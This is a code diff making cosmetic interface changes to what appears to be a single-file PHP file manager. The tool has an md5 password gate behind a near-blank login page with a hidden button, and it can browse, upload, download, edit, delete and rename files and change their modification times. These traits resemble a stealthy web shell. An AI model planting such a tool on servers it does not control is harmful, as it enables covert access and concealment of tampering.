@@ -17,7 +17,7 @@ if (!isset($_SESSION['logged_in'])) {
     if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['password']) && md5($_POST['password'])==$password) {
         $_SESSION['logged_in'] = true; header('Location:'); exit;
     }
-    echo '<!DOCTYPE html><html><body class="p-4"><form method="post"><input type="hidden" name="password" placeholder="Password" class="border px-2"> <button style="display:none">Login</button></form></body></html>'; exit;
+    echo '<!DOCTYPE html><html><body class="p-4"><form method="post"><input type="password" name="password" class="border px-2"> <button style="display:none">Login</button></form></body></html>'; exit;
 }
 
 // Path
@@ -233,20 +233,37 @@ $(function(){
 <div class="container mx-auto p-4 bg-white rounded-lg shadow">
     <div class="flex justify-between mb-4">
     <div class="flex space-x-2">
-    <?php if($path!=$parent):?>
-    <a href="?path=<?=urlencode($parent)?>" class="bg-gray-300 px-2 py-1 rounded">⬅️ Up</a>
-    <?php endif;?>
     <a href="?path=<?=urlencode($docroot)?>" class="bg-gray-300 px-2 py-1 rounded">🏠 Root</a>
     <a href="?path=<?=urlencode($self_dir)?>" class="bg-gray-300 px-2 py-1 rounded">📂 FM Dir</a>
     </div>    
     <div class="flex space-x-2">
     <form method="get" class="flex space-x-1"><input type="hidden" name="path" value="<?=htmlspecialchars($path)?>"><input type="text" name="search" value="<?=htmlspecialchars($search)?>" placeholder="Search..." class="border px-2 rounded"><button class="bg-gray-300 px-2 rounded">🔍</button></form>
-    <button id="showDownloader" class="bg-purple-500 text-white px-2 py-1 rounded">⬇️ Downloader</button>
-    <button id="showNewFolder" class="bg-green-500 text-white px-2 py-1 rounded">📁 New Folder</button>
-    <button id="showNewFile" class="bg-green-500 text-white px-2 py-1 rounded">📄 New File</button>
+    <button id="showDownloader" class="bg-gray-300 px-2 py-1 rounded flex items-center space-x-1">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 text-gray-700">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
+        </svg>
+        <span>Down</span>
+    </button>
+    <button id="showNewFolder" class="bg-gray-300 px-2 py-1 rounded flex items-center space-x-1">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 text-gray-700">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M12 10.5v6m3-3H9m4.06-7.19-2.12-2.12a1.5 1.5 0 0 0-1.061-.44H4.5A2.25 2.25 0 0 0 2.25 6v12a2.25 2.25 0 0 0 2.25 2.25h15A2.25 2.25 0 0 0 21.75 18V9a2.25 2.25 0 0 0-2.25-2.25h-5.379a1.5 1.5 0 0 1-1.06-.44Z" />
+        </svg>
+        <span>ND</span>
+    </button>
+    <button id="showNewFile" class="bg-gray-300 px-2 py-1 rounded flex items-center space-x-1">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 text-gray-700">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m3.75 9v6m3-3H9m1.5-12H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
+        </svg>
+        <span>NF</span>
+    </button>
     <form method="post" enctype="multipart/form-data" id="uploadForm" class="inline">
     <input type="file" name="files[]" multiple id="uploadInput" class="hidden">
-    <button type="button" id="uploadBtn" class="bg-blue-500 text-white px-2 py-1 rounded">⬆️ Upload</button>
+    <button type="button" id="uploadBtn" class="bg-gray-300 px-2 py-1 rounded flex items-center space-x-1">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 text-gray-700">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M12 16.5V9.75m0 0 3 3m-3-3-3 3M6.75 19.5a4.5 4.5 0 0 1-1.41-8.775 5.25 5.25 0 0 1 10.233-2.33 3 3 0 0 1 3.758 3.848A3.752 3.752 0 0 1 18 19.5H6.75Z" />
+        </svg>
+        <span>Upload</span>
+    </button>
     </form>
     </div></div>
 
@@ -255,11 +272,12 @@ $(function(){
     <th class="p-2 text-left"><a href="<?=sort_url('name',$sort,$order,$path,$search)?>" class="hover:underline">Name<?=($sort=='name'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
     <th class="p-2"><a href="<?=sort_url('mtime',$sort,$order,$path,$search)?>" class="hover:underline">Last Modified<?=($sort=='mtime'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
     <th class="p-2">Action</th></tr>
+    <?php if($path != $parent): ?><tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700"><td class="p-2"><a href="?path=<?=urlencode($parent)?>" class="text-blue-500">📁 ..</a></td><td class="p-2">-</td><td class="p-2">-</td></tr><?php endif; ?>
     <?php foreach(array_merge($folders,$regular_files) as $f):$fp=$path.'/'.$f['name'];$mtime=date('Y-m-d\TH:i',$f['mtime']); ?>
-    <tr class="border-t">
+    <tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700">
     <td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
     <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-mtime="<?=$mtime?>" class="mtime-btn underline text-blue-500"><?=date('Y-m-d H:i',$f['mtime'])?></button></td>
-    <td class="p-2 space-x-1"><?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f['name'])?>" class="edit-btn bg-yellow-300 px-2 rounded">✏️ Edit</button><?php endif;?><button data-file="<?=htmlspecialchars($f['name'])?>" class="rename-btn bg-green-300 px-2 rounded">✏️ Rename</button><button data-file="<?=htmlspecialchars($f['name'])?>" class="delete-btn bg-red-400 px-2 rounded">🗑️ Delete</button></td></tr><?php endforeach;?>
+    <td class="p-2 space-x-1"><?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f['name'])?>" class="edit-btn bg-gray-300 px-2 rounded" title="Edit">📝</button><?php endif;?><button data-file="<?=htmlspecialchars($f['name'])?>" class="rename-btn bg-gray-300 px-2 rounded" title="Rename">✍🏼</button><button data-file="<?=htmlspecialchars($f['name'])?>" class="delete-btn bg-gray-300 px-2 rounded" title="Delete">🗑️</button></td></tr><?php endforeach;?>
     </table>
 </div>
 
